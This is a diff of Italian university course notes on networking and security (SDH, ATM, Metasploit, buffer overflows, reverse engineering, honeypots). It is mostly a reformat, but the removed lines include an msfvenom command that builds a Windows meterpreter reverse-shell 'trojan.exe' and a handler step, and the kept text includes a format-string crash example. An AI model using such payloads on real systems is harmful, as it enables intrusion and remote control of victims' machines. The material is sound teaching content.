@@ -1,4 +1,4 @@
-\documentclass{article}
+\documentclass[8pt]{extarticle}
 
 \usepackage{amsmath}
 \usepackage{listings}
@@ -8,7 +8,7 @@
 \usepackage{graphicx}
 \usepackage{titling}
 \usepackage[utf8]{inputenc}
-\usepackage[english]{babel}
+\usepackage[italian]{babel}
 \usepackage{amsmath}
 \usepackage{fancyhdr}
 \usepackage{lastpage}
@@ -17,12 +17,16 @@
 \usepackage{hyperref}
 \usepackage{float}
 \usepackage{hyperref}
+\usepackage[sfdefault]{roboto}
+\usepackage[a4paper, margin=1cm, footskip=0.7cm]{geometry}
+\usepackage{enumerate}
+\usepackage{enumitem}
 
-\addtolength{\oddsidemargin}{-.875in}
-\addtolength{\evensidemargin}{-.875in}
-\addtolength{\textwidth}{1.75in}
-\addtolength{\topmargin}{-.875in}
-\addtolength{\textheight}{1.75in}
+\renewcommand{\baselinestretch}{0.5}
+\setlist{nolistsep}
+\setenumerate{itemsep=0pt,topsep=0pt}
+\setitemize{itemsep=0pt, topsep=0pt}
+
 \title{\Huge Applicazioni delle reti telematiche \vspace{1cm}}
 \author{Edoardo Terzi, Alessandro Bianchi, Davide Bertacco, Luca Giussani, Paolo Fiori, \\
 Davide Taurisano, Giovanni Converso, Jonathan De Boni, Eric Palmas, Kevin Dominguez.\vspace{0.5cm}}
@@ -77,7 +81,7 @@ monitoraggio in tempo reale dell'intera rete di trasmissione.
 \noindent
 \\\\
 L'Administrative Unit, AU, contiene tutto il flusso risultante dal processo di multiplazione dei tributari,
- prima dell'inserimento finale nel payload della trama SDH.\\\\
+ prima dell'inserimento finale nel payload della trama SDH.
 In generale, la posizione di inizio dell'AU non è allineata con il primo byte utile dopo l'overhead: 
 in fase di generazione della trama finale l'AU viene normalmente allocato a partire da un punto intermedio 
 dei 261x9 byte destinati al payload. Il riferimento (puntatore) alla posizione della trama in cui viene 
@@ -111,7 +115,7 @@ Le reti di telecomunicazioni che implementano il protocollo ATM vengono dette re
 \subsubsection{Funzionamento}
 \begin{figure}[H]
     \center
-    \includegraphics[scale=0.4]{images/ATM1.png}
+    \includegraphics[scale=0.3]{images/ATM1.png}
     \caption{Formato di una cella ATM}\label{fig:1}
 \end{figure}
 \noindent
@@ -132,7 +136,7 @@ questo dovrà consultare una tabella indicizzata da porta in ingresso ed etichet
 uscita e la nuova etichetta da assegnare alla cella. Questa architettura molto semplice facilita 
 l'instradamento in hardware permettendo di realizzare switch ad alta velocità (la commutazione 
 per etichetta è più veloce rispetto alla commutazione IP basata sull'elaborazione in base a tabelle di 
-routing indicizzate per sottoreti).\\\\
+routing indicizzate per sottoreti).
 L'etichetta è composta di due valori presenti nell'header di ciascuna cella, VPI e VCI:\\
 \begin{itemize}
     \item Il VPI (Virtual Path Identifier) identifica il path virtuale su cui il circuito virtuale è stato attivato.
@@ -282,8 +286,7 @@ Protocol” (LDP) per stabilire tali immissioni.
     \item Creazione di tunnel nel percorso dei routers
 \end{itemize}
 \section{Metasploit}
-\subsection{Teoria}
-\subsubsection{Penetration Test}
+\subsection{Penetration Test}
 Il penetration test è il processo operativo di valutazione della sicurezza di un sistema o di una rete che 
 simula l'attacco di un utente malintenzionato. L'analisi comprende più fasi ed ha come obiettivo evidenziare 
 le debolezze della piattaforma fornendo il maggior numero di informazioni sulle vulnerabilità che ne hanno 
@@ -296,7 +299,7 @@ difesa e del livello di penetrazione raggiunto nei confronti: 
     \item delle vulnerabilità esterne al sistema,
     \item della sicurezza fisica.
 \end{itemize}
-\subsubsection{Procedura Black \& White Box}
+\subsection{Procedura Black \& White Box}
 I processi di penetration test possono essere effettuati in diverse modalità. La differenza consiste 
 sulla quantità e qualità delle informazioni disponibili agli analisti riguardo ai sistemi analizzati.
 \begin{itemize}
@@ -307,22 +310,20 @@ sulla quantità e qualità delle informazioni disponibili agli analisti riguardo
     IP presenti nella rete.
     \item \textbf{Grey Box:} sono varianti a queste metodologie.
 \end{itemize}
-\subsubsection{Analisi dell’architettura e rilevazione delle vulnerabilità}
+\subsection{Analisi dell’architettura e rilevazione delle vulnerabilità}
 Vengono acquisite inizialmente le informazioni principali sull'architettura della piattaforma e sui servizi 
 offerti. Dall'analisi di questi dati deriva la scelta di come condurre il passo successivo, consistente in 
 una enumerazione dei principali errori e problemi. 
-\subsubsection{Attacco e redazione di un report}
+\subsection{Attacco e redazione di un report}
 L'attività si conclude nello sviluppo della reportistica composta dal report di analisi sommaria dedicato 
 al management o executive summary, contenente l'analisi dell'impatto di rischio di quanto riscontrato e 
 tempistiche per l'azione di rientro o mitigazione delle problematiche riscontrate, e dal report tecnico, 
 contenente l'analisi dettagliata dei problemi e la soluzione tecnica. 
-\subsubsection{OS per il penetration test}
-Kali, Parrot Security OS, BlackBox, BlackArch, Samurai Web Testing Framework 
-\subsubsection{Kali linux}
+\subsection{Kali linux}
 OS basato sulla distribuzione Debian GNU/Linux, permette di testare penetration testing OS, rewrite of 
 BackTrack Linux e sviluppare sicurezza preventiva o offensiva. Ha più di 300 tool di supporto, è 
 multilingua, è personalizzabile e flessibile, e ha una grande community per il supporto.
-\paragraph{Tool principali:} 
+\subsubsection{Tool principali} 
 \begin{itemize}
     \item Metasploit: security assesment framework
     \item NMAP: network scanner 
@@ -334,17 +335,17 @@ multilingua, è personalizzabile e flessibile, e ha una grande community per il 
     \item SET: Social Engineering Toolkit
     \item Bettercap: MITM attacks 
 \end{itemize}
-\subsubsection{Metasploit framework}
+\subsection{Metasploit framework}
 Si tratta di uno strumento open source per lo sviluppo e l'esecuzione di exploits ai danni di una macchina 
 remota. È caratterizzato da: interfaccia a linea di comando, import da terze parti, exploitation manuale e 
 azioni di forza bruta anch’esse condotte manualmente. Questa versione di Metasploit Project include anche 
 Zenmap, un famoso port scanner, e un compilatore per Ruby, il linguaggio usato per questa versione. 
 \begin{figure}[H]
     \center
-    \includegraphics[scale=0.3]{images/SchemaMetasploit.png}
+    \includegraphics[scale=0.2]{images/SchemaMetasploit.png}
     \caption{Schema funzionale}\label{fig:1}
 \end{figure}
-\paragraph{Definizione exploit:}
+\subsubsection{Definizione exploit}
 Un exploit è una tipologia di script, virus, worm, porzione di dati o binario che sfrutta un bug 
 o una vulnerabilità per creare comportamenti non previsti in software, hardware, o in sistemi elettronici, 
 ad es. per ottenere l'accesso a sistemi informatici, permettere l'acquisizione dei privilegi amministrativi, 
@@ -359,7 +360,7 @@ o attacchi denial of service (DoS o il correlato DDoS). \\\\
     codificato. 
     \item Eseguire l’exploit.
 \end{enumerate}
-\paragraph{Metasploit Auxiliary Modules}
+\subsubsection{Metasploit Auxiliary Modules}
 \begin{itemize}
     \item Exploit senza payload
     \item Scanning: tecnica per ricercare e mappare le debolezze di un'applicazione, di un computer o 
@@ -370,20 +371,20 @@ o attacchi denial of service (DoS o il correlato DDoS). \\\\
      che identifica un certo file con le caratteristiche intrinseche stesse del file.
      \item Automated task
 \end{itemize}
-\paragraph{Metasploit Encoders}
+\subsubsection{Metasploit Encoders}
 \begin{itemize}
     \item Code obfuscation
     \item Antivirus bypassing
     \item Encrypt payload (ShikataGaNai, Bloxor, Nonalpha)
 \end{itemize}
-\paragraph{Metasploit Exploit \& Payload}
+\subsubsection{Metasploit Exploit \& Payload}
 \begin{itemize}
     \item List of exploit
     \item Different OS: Unix, Windows, Linux, Android, Solaris, multi
     \item Payload (generate malware use exploit). \textbf{Stager:} connection attacker or victim. 
      \textbf{Stage:} malware.
 \end{itemize}
-\paragraph{Console Commands}
+\subsubsection{Console Commands}
 \begin{itemize}
     \item msfconsole: apre la console di metasploit
     \item msfupdate: aggiorna il db degli exploit
@@ -392,53 +393,7 @@ o attacchi denial of service (DoS o il correlato DDoS). \\\\
     \item set: assegna i parametri del modulo
     \item exploit: esegue l’attacco
 \end{itemize}
-
-\subsection{Pratica}
-\begin{itemize}
-    \item \textbf{Msvenom:} è un tool incluso nel framework metasploit, in grado di creare creare exploit, 
-    payload… Per poterlo utilizzare bisogna semplicemente aprire il terminale e digitare la pipeline di 
-    creazione dell’exploit, specificando i parametri desiderati.
-    \item \textbf{Msfconsole:} anch’esso è un tool di metasploit. La differenza sostanziale col precedente 
-    è che esso fornisce un’interfaccia “grafica” e che la pipeline viene costruita man mano.
-\end{itemize}
-\begin{figure}[H]
-    \center
-    \includegraphics[scale=0.23]{images/MsfvenomMsfconsoleScreen.png}
-    \caption{Esempio di utilizzo dei due tool}\label{fig:1}
-\end{figure}
-\subsubsection{Creazione di un malware con msfvenom}
-\begin{lstlisting}[language=bash]
-    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.179.128 
-    LPORT=8080 -f exe -o trojan.exe
-\end{lstlisting}
-\begin{figure}[H]
-    \center
-    \includegraphics[scale=0.35]{images/MsfvenomExample.png}
-    \caption{Esempio creazione malware}\label{fig:1}
-\end{figure}
-\subsubsection{Creazione di un malware con msfconsole}
-Dalla macchina kali poi eseguire i seguenti comandi per poter avere un handler delle connessioni aperte \\
-“involontariamente” dalla macchina infettata e poter eseguire lo screenshot:
-\begin{figure}[H]
-    \center
-    \includegraphics[scale=0.4]{images/MfsconsoleExample.png}
-    \caption{Esempio creazione malware}\label{fig:1}
-\end{figure}
-\noindent
-Con:
-\begin{lstlisting}[language=bash]
-    exploit -j
-\end{lstlisting} faccio partire un job in background che mi notifica in caso 
-qualcuno esegua il malware appena creato.
-\subsubsection{Tecniche di fuzzing}
-Sono delle tecniche con utilizzo di test automatici per rilevare errori di codifica e falle 
-di sicurezza nei sofwtare/sistemi operativi.
-\paragraph{Utilizzate per:}
-\begin{itemize}
-    \item Trovare fault o difetti
-    \item Verificare il risultato quando vengono usate con test Black Box, Beta testing \dots
-\end{itemize}
-\paragraph{Come fare fuzz testing:}
+\subsubsection{Come fare fuzz testing}
 \begin{enumerate}
     \item Identificare i sistemi target
     \item Identificare input
@@ -447,7 +402,7 @@ di sicurezza nei sofwtare/sistemi operativi.
     \item Monitorare il comportamento di sistema
     \item Notificare i difetti
 \end{enumerate}
-\paragraph{Tipi di bug detettati:}
+\subsubsection{Tipi di bug detettati}
 \begin{itemize}
     \item Problemi di asserzione e perdite di memoria questa metodologia è ampiamente utilizzata per 
     applicazioni di grandi dimensioni in cui i bug stanno compromettendo la sicurezza della memoria, 
@@ -462,7 +417,6 @@ di sicurezza nei sofwtare/sistemi operativi.
 \section{Fibra ottica}
 
 \section{Buffer overflow}
-\subsection{Teoria}
 Il microprocessore è una tipologia particolare di circuito elettronico che si contraddistingue per 
 essere interamente costituita da uno o più circuiti integrati di dimensioni molto ridotte. 
 La tecnologia a microprocessore è attualmente quella più utilizzata per la realizzazione della CPU e 
@@ -471,7 +425,7 @@ le sue elaborazioni, un insieme di istruzioni fondamentali di base (instruction 
 Si può trovare una lista di tutti i microprocessori della Intel, dal 4-bit Intel 4004 fino ai più 
 moderni, al seguente link: \url{https://en.wikipedia.org/wiki/List_of_Intel_microprocessors}. \\
 Per confrontarli invece si può andare su \url{https://en.wikipedia.org/wiki/Comparison_of_Intel_processors}.
-\subsubsection{Intel i386}
+\subsection{Intel i386}
 Detto anche i80386, è una famiglia di microprocessori monolitici general purpose x86 dell'Intel Corporation 
 prodotti tra il 1985 e il 2007. Le schede madri che supportavano i microprocessori Intel i386 erano 
 molto complesse e costose, paragonate a quelle per i suoi predecessori, ma l'adozione su larga scala 
@@ -483,7 +437,7 @@ protetta. L'Intel i386 fu anche la famiglia di microprocessori su cui nacque il�
 Offre 16 registri di interesse al programmatore, i quali possono essere raggruppati nelle seguenti categorie:
 \begin{figure}[H]
     \center
-    \includegraphics[scale=0.3]{images/BO1.png}
+    \includegraphics[scale=0.2]{images/BO1.png}
     \caption{Registri}\label{fig:1}
 \end{figure}
 \begin{itemize}
@@ -495,10 +449,8 @@ Offre 16 registri di interesse al programmatore, i quali possono essere raggrupp
     \item Registri di istruzioni e stato: registri special purpose usati per memorizzare e modificare 
     alcuni aspetti dello stato del processore 80386
 \end{itemize}
-\subsubsection{Tipi di buffer overflow}
-\paragraph{Buffer overflow della heap}
-\noindent
-\\
+\subsection{Tipi di buffer overflow}
+\subsubsection{Buffer overflow della heap}
 La memoria heap viene allocata in maniera dinamica dalle applicazioni run-time e solitamente contiene 
 dati dei programmi utente. Gli heap overflow vengono solitamente usati dai cracker per abusare di 
 programmi contenenti alcune vulnerabilità dovute ad insufficiente validazione degli input, calcolo 
@@ -510,9 +462,7 @@ informazioni di gestione) della heap, prossimi alla destinazione dell'insieme di
 l'attaccante può sovrascrivere una locazione arbitraria di memoria, con una piccola quantità di dati. 
 Nella maggior parte degli ambienti, questo può fornire all'attaccante il controllo dell'esecuzione del 
 programma. 
-\paragraph{Buffer overflow dello stack}
-\noindent
-\\
+\subsubsection{Buffer overflow dello stack}
 lo stack è un’area di memoria in cui vengono salvate le variabili locali e i parametri passati alla funzione 
 (gestito come LIFO). Qui i dati adiacenti al buffer che potrebbero essere sovrascritti dai dati extra sono 
 il return address e il frame pointer. Se i dati in eccesso sovrascrivono frame pointer e return address, 
@@ -529,12 +479,10 @@ return address che potrebbe contenere:
 \end{itemize}
 \begin{figure}[H]
     \center
-    \includegraphics[scale=0.3]{images/BO2.png}
+    \includegraphics[scale=0.2]{images/BO2.png}
     \caption{Struttura della memoria}\label{fig:1}
 \end{figure}
-\paragraph{Integer overflow}
-\noindent
-\\
+\subsubsection{Integer overflow}
 Ovvero quando viene sorpassato il limite massimo per un Integer, che è 2dimensione in bit -1. 
 Con len1 = len2 = 2147483648 = 231, l’operazione di somma len1 + len2 avrà quindi come risultato il 
 valore 2147483648 + 2147483648 = 4294967296 = $2\textsuperscript{32}$. È proprio qui che si genera l’integer overflow. 
@@ -545,19 +493,17 @@ sovrascrivere una zona di memoria superiore a quella allocata. In conclusione, 
 consentita la sovrascrittura dello stack ricadendo così nel più classico buffer overflow sullo stack del processo.
 \begin{figure}[H]
     \center
-    \includegraphics[scale=0.3]{images/BO3.png}
+    \includegraphics[scale=0.2]{images/BO3.png}
     \caption{Esempio di codice}\label{fig:1}
 \end{figure}
-\paragraph{String format overflow}
-\noindent
-\\
+\subsubsection{String format overflow}
 Quando nei sistemi di print (ad es. in C) si usano delle formattazioni o ne vengono iniettate alcune maligne. 
 Es. printf("\%s\%s\%s\%s\%s\%s\%s\%s\%s\%s\%s"); Ogni "\%s" cerca di visualizzare il contenuto di un buffer di 
 caratteri dall'indirizzo iniziale presente sullo stack fino al carattere terminatore ("0"). Inserendo quindi molti 
 “\%s", la funzione sposterà il puntatore in avanti fino ad aree di memoria non mappate nel frame dell'applicazione, 
 così facendo cercherà di leggere da "indirizzi illegali", causando l'errore “segmentation fault” che manda in 
 crash il programma.
-\subsubsection{Stack pointer}
+\subsection{Stack pointer}
 Ci sono 3 tipologie di puntatori alla memoria stack (la quale cresce verso il basso):
 \begin{itemize}
     \item IP (Instruction Pointer): contiene l’indirizzo di ritorno.
@@ -570,23 +516,23 @@ Ci sono 3 tipologie di puntatori alla memoria stack (la quale cresce verso il ba
 \end{itemize}
 \begin{figure}[H]
     \center
-    \includegraphics[scale=0.2]{images/BO4.png}
+    \includegraphics[scale=0.15]{images/BO4.png}
     \caption{Struttura dello Stack}\label{fig:1}
 \end{figure}
 Le operazioni sullo stack possono essere PUSH (inserisco l’elemento in cima alla pila) 
 oppure POP (rimuovo il primo elemento della pila). 
 \begin{figure}[H]
     \center
-    \includegraphics[scale=0.2]{images/BO5.png}
+    \includegraphics[scale=0.25]{images/BO5.png}
     \caption{Esempio operazioni sullo Stack}\label{fig:1}
 \end{figure}
-\subsubsection{Iniezione di shellcode}
+\subsection{Iniezione di shellcode}
 Nel caso di un buffer overflow dello stack, spesso gli hacker ricorrono a iniezioni di shellcode nel buffer. 
 L’overflow quindi non va ad inserire semplicemente istruzioni “extra” al buffer, bensì inserisce del codice 
 eseguibile in linguaggio macchina (assembly) e la sovrascrittura del return address viene fatta in modo da 
 rimandare al codice iniettato all’interno del buffer. Questo codice solitamente richiama una shell (con la 
 chiamata alla funzione execve) che eseguirà con gli stessi privilegi del programma di partenza. 
-\subsubsection{Protezione dello stack}
+\subsection{Protezione dello stack}
 Per detettare gli overflow si può utilizzare StackGuard, il quale controlla il Canary Value o Canary Word. 
 Questi non sono altro che un valore (solitamente posto prima del return address, StackShield) che, una volta 
 sovrascritto da un buffer overflow, indica che è successo qualcosa che non va e quindi funge da controllo di 
@@ -601,11 +547,8 @@ per fare degli esperimenti di correzione di un bug o capire cosa sia successo. \
     \item Breakpoint: b funcion()
     \item Read address: x \$ebp, x \&variable
 \end{itemize}
-\subsection{Pratica}
-
 \section{Reverse Code Engineering}
-\subsection{Teoria}
-\subsubsection{Motivazioni per il Reverse Code Engineering}
+\subsection{Motivazioni per il Reverse Code Engineering}
 \noindent
 \textbf{Hacking / Cracking:}
 L'hacking è l'insieme dei metodi, delle tecniche e delle operazioni volte a conoscere, accedere e 
@@ -624,14 +567,13 @@ campione di malware, come virus, worm, trojan, rootkit o backdoor. Per malware o
 intende qualsiasi software destinato a danneggiare il sistema operativo host o per rubare dati 
 sensibili da utenti, organizzazioni o società. Il malware può includere software che raccoglie 
 informazioni utente senza autorizzazione.
-\subsubsection{Approccio di reverse code engineering}
+\subsection{Approccio di reverse code engineering}
 \begin{figure}[H]
     \center
     \includegraphics[scale=0.3]{images/Macrofasi.png}
     \caption{le 5 macrofasi}\label{fig:1}
 \end{figure}
-\paragraph{Prova di esecuzione:}
-\noindent
+\subsubsection{Prova di esecuzione}
 La prova di esecuzione ci può fornire numerose informazioni:
 Ci permette di studiare il comportamento del programma e le connessioni verso eventuali servizi 
 (server) esterni, ci permette di capire come funziona il meccanismo di protezione del software 
@@ -639,8 +581,7 @@ Ci permette di studiare il comportamento del programma e le connessioni verso ev
 generali sul software e sull’ambiente di deployment di quest’ultimo.\\\\
 Nel caso l’eseguibile si tratti di un malware è necessario fare questo procedimento in un 
 ambiente isolato. 
-\paragraph{Data Gathering:}
-\noindent
+\subsubsection{Data Gathering}
 In questa fase è possibile raccogliere altre informazioni sull’eseguibile:
 Si utilizzano software per la Detection di ambienti di sviluppo e versioni.
 Vengono raccolti dati sul linguaggio di programmazione, sulla protezione e sul 
@@ -652,7 +593,7 @@ sistema operativo utilizzato. Il Data Gathering è una attività necessaria per 
 \end{figure}
 \noindent
 Informazioni raccolte: MS Windows, Applicazione a 32 bit, Dephi,non pacchetizzato.
-\paragraph{Analisi:}
+\subsubsection{Analisi}
 Faccio un’analisi dettagliata del software e decido la tipologia di approccio che voglio prendere.
 Inoltre in questa fase viene definito l’obiettivo finale.
 Esempio:\\\\
@@ -661,7 +602,7 @@ Esempio:\\\\
     \item Tipologia di approccio? Patch del file
     \item Protezione? Nessuna
 \end{itemize}
-\subsubsection{Definizione dell’ambiente per RCE}
+\subsection{Definizione dell’ambiente per RCE}
 In questa fase scegliamo, in base all’obiettivo prefissato precedentemente, l’ambiente di analisi 
 che andremo ad utilizzare. Gli ambienti di analisi conosciuti sono i seguenti:
 \begin{itemize}
@@ -687,7 +628,7 @@ che andremo ad utilizzare. Gli ambienti di analisi conosciuti sono i seguenti:
     file, un Decompiler  che consente di ricostruire il codice sorgente (a grandilinee) o un debugger che 
     consente l’esecuzione graduale del software.
 \end{itemize}
-\subsubsection{Esecuzione RE}
+\subsection{Esecuzione RE}
 Svlogiamo i seguenti passi:
 \begin{itemize}
     \item Inizio del lavoro sul programma compilato
@@ -700,10 +641,10 @@ soluzione: usiamo un disassembler (processori 32 bit, processori 64 bit, alri si
 dell’obiettivo:
 \begin{figure}[H]
     \center
-    \includegraphics[scale=0.4]{images/RCE2.png}
+    \includegraphics[scale=0.3]{images/RCE2.png}
     \caption{Esempio}\label{fig:1}
 \end{figure}
-\subsubsection{Programmi più utilizzati per l’RCE}
+\subsection{Programmi più utilizzati per l’RCE}
 \noindent
 \textbf{OllyDbg:} OllyDbg è un debugger, disponibile solo in versione a 32 bit, per sistemi Microsoft Windows. 
 OllyDbg traccia i registri, riconosce le funzioni e i parametri passati alle principali librerie standard, 
@@ -725,7 +666,7 @@ reverse engineering.\\\\
 dalla National Security Agency (NSA). Ghidra è visto da molti ricercatori come un concorrente di IDA Pro 
 e JEB Decompiler. Il software è scritto in Java usando il framework Swing per la GUI. Il componente 
 Decompiler è scritto in C++. 
-\subsubsection{Reverse Code Engineering in ambiente Android}
+\subsection{Reverse Code Engineering in ambiente Android}
 E’ possibile utilizzare un Android virtual machine chiamata Dalvik, l’estensione dei file è .apk.
 Un file .apk ha la seguente struttura:
 \begin{itemize}
@@ -737,12 +678,12 @@ Un file .apk ha la seguente struttura:
 \end{itemize}
 \begin{figure}[H]
     \center
-    \includegraphics[scale=0.4]{images/RCE3.png}
+    \includegraphics[scale=0.27]{images/RCE3.png}
     \caption{Schema del processo di compilazione}\label{fig:1}
 \end{figure}
 \begin{figure}[H]
     \center
-    \includegraphics[scale=0.4]{images/RCE4.png}
+    \includegraphics[scale=0.3]{images/RCE4.png}
     \caption{Processo di Disassembling}\label{fig:1}
 \end{figure}
 \noindent
@@ -752,7 +693,8 @@ Un file .apk ha la seguente struttura:
 le risorse in forma quasi originale, in seguito è anche possibile modificare il codice. È Multi piattaforma.
 \subsubsection{Smali}
 \noindent
-\textbf{Tipi in Smali:} V \(void\), Z \(boolean\), B \(byte\), S \(short\), C \(char\), F \(float\), I \(int\), J \(long\), D \(double\), parentesi quadrata \(array\).\\
+\textbf{Tipi in Smali:} V \(void\), Z \(boolean\), B \(byte\), S \(short\), C \(char\), F \(float\), 
+I \(int\), J \(long\), D \(double\), parentesi quadrata \(array\).\\
 \textbf{Sintassi Classi in Smali:} Nome del package separato da ‘/’, L \(prefisso\), ; \(suffisso\)\\
 Esempio: \(Lcom/example/myapp/MyClass\)
 \begin{figure}[H]
@@ -768,7 +710,7 @@ Esempio: \(Lcom/example/myapp/MyClass\)
 \noindent
 \textbf{JD-GUI:} è un Decompilatore Java che prende in input un .jar e restituisce in output un .java\\
 \textbf{Dex2jar:} Converte un file DEX (Conver Dalvik bytecode) in file JAR (java bytecode).
-\subsubsection{Approccio generale per RCE su Android}
+\subsection{Approccio generale per RCE su Android}
 \begin{itemize}
     \item Unzip APK e disassemblamento classes.dex
     \item Analisi statica del codice
@@ -777,20 +719,14 @@ Esempio: \(Lcom/example/myapp/MyClass\)
 \end{itemize}
 \begin{figure}[H]
     \center
-    \includegraphics[scale=0.6]{images/RCE7.png}
+    \includegraphics[scale=0.5]{images/RCE7.png}
     \caption{Schema riassuntivo dell'approccio}\label{fig:1}
 \end{figure}
-\subsection{Pratica}
-
-\subsubsection{Reverse APK}
-
-\subsubsection{Reverse EXE}
-
 \section{Honeypot e Honeynet}
 \subsection{Teoria}
 \subsubsection{Cos'è un honypot}
 \noindent
-\begin{quotation}\small\selectlanguage{english}
+\begin{quotation}\small\selectlanguage{italian}
 “A honeypot is an infomation system resource whose value lies in unauthorized or illicit use of that resource.” 
 - Lance Spitzner    
 \end{quotation}
@@ -856,7 +792,7 @@ modo tale da spostare gli intrusi su un database trappola mentre l’applicazion
 \noindent
 \\
 Sfruttare un web server o un sito esposto come honeypot. Creare un file adminLogin.php (nome che attira): \\
-\begin{lstlisting}[language=java]
+\begin{lstlisting}[language=java, basicstyle=\small]
 function sendData()
 {
     $socket = 
@@ -883,7 +819,7 @@ function sendData()
     return TRUE;
 }
 \end{lstlisting}
-\begin{lstlisting}[language=html]
+\begin{lstlisting}[language=html, basicstyle=\small]
 <html>
     <head>
         <title>BitNinja Honeypot</title>
@@ -893,7 +829,7 @@ function sendData()
     </body>
 </html>
 \end{lstlisting}
-\begin{lstlisting}[language=php]
+\begin{lstlisting}[language=php, basicstyle=\small]
 <?php
     /*
      * Finaly, we flush the output - send the content to the client - and
@@ -935,25 +871,25 @@ Simula molto bene il comportamento di un sistema industriale rallentando le risp
 di un sistema ad alto carico come uno industriale. Come implementare uno SCADA honeypot:
 \begin{itemize}
     \item Installare le librerie e dipendenze necessarie: 
-    \begin{lstlisting}[language=bash]
+    \begin{lstlisting}[language=bash, basicstyle=\small]
     sudo apt-get install libsmi2ldbl snmp-mibs-downloader python-dev 
     llibevent-dev libxslt1-dev libxml2-dev
     \end{lstlisting}
     \item Installare python
-    \begin{lstlisting}[language=bash]
+    \begin{lstlisting}[language=bash, basicstyle=\small]
     sudo apt-get install python-pip
     \end{lstlisting}
     \item Installare MySQL e le dipendenze
-    \begin{lstlisting}[language=bash]
+    \begin{lstlisting}[language=bash, basicstyle=\small]
     sudo apt-get install python-dev libmysqlclient-dev
     sudo apt-get install MySQL-python
     \end{lstlisting}
     \item Installare Conpot
-    \begin{lstlisting}[language=bash]
+    \begin{lstlisting}[language=bash, basicstyle=\small]
     sudo pip install conpot
     \end{lstlisting}
     \item Run Conpot
-    \begin{lstlisting}[language=bash]
+    \begin{lstlisting}[language=bash, basicstyle=\small]
     sudo conpot -template default
     \end{lstlisting}
 \end{itemize}
@@ -993,10 +929,10 @@ da scudo assorbendo gli attacchi)
 \subsubsection{LOG di un honeypot}
 \begin{figure}[H]
     \center
-    \includegraphics[scale=0.3]{images/HP2.png}
+    \includegraphics[scale=0.25]{images/HP2.png}
     \caption{Esempio di un LOG}\label{fig:1}
 \end{figure}
-\textbf{IP-src} = ip dell’hacker con relativa location \\
+\textbf{IP-src} = ip dell'hacker con relativa location \\
 \textbf{IP-dst} = honeypot\\
 \textbf{Commands} = comandi eseguiti dall’hacker. Alla fine è possibile notare un wget con il relativo IP.  
 è possibile capire che l’attacker vuole scaricare un virus che risiede nella sua macchina. Facendo così la scarica nella macchina infettata.\\
@@ -1054,8 +990,6 @@ Chiave di sicurezza:
     \item Integrità di sistema: Assicura che il sistema esegua le sue operazioni in un’unica maniera e che funzioni tempestivamente senza mai 
     negare i servizi agli utenti autorizzati
 \end{itemize}
-\section{Challenge}
-
 \section{Casi interessanti}
 \subsection{Hacking Team}
 Hacking Team è una società di Information technology con sede a Milano. Vende servizi di intrusione offensiva e di 
@@ -1140,7 +1074,7 @@ La connessione viene creata da uno dei file scaricati (rastlsc.exe): questo tent
 una connessione verso l’esterno e successivamente killerà sé stesso. 
 \begin{figure}[H]
     \center
-    \includegraphics[scale=0.3]{images/OceanLotus1.png}
+    \includegraphics[scale=0.25]{images/OceanLotus1.png}
     \caption{Campo “Referer”}\label{fig:1}
 \end{figure}
 \noindent
@@ -1151,7 +1085,7 @@ Il compito principale di questo file sembra quindi quello di scaricare altri fil
 preparare l’ambiente e creare una connessione verso l’esterno con rastlsc.exe.
 \begin{figure}[H]
     \center
-    \includegraphics[scale=0.4]{images/OceanLotus2.png}
+    \includegraphics[scale=0.3]{images/OceanLotus2.png}
     \caption{Reverse code}\label{fig:1}
 \end{figure}
 \subsection{Wannacry}
